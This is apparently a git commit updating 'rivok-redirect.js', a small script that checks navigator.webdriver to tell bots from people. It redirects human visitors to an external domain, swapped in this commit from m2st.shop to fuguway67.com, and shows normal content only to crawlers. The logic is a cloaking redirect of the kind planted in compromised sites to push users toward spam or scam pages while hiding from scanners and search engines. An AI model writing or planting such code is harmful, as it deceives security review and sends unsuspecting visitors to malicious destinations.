a87729a36a417c0b7c2c3978a2385dfbb818ce42
collabaratory <gdar59968@gmail.com>
2026-04-17 22:10:00 +0300

    Update rivok-redirect.js

--- rivok-redirect.js
+++ rivok-redirect.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://m2st.shop/3/rd.php?url=/p/tD4");
+  window.location.replace("https://fuguway67.com/c283f71e7");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
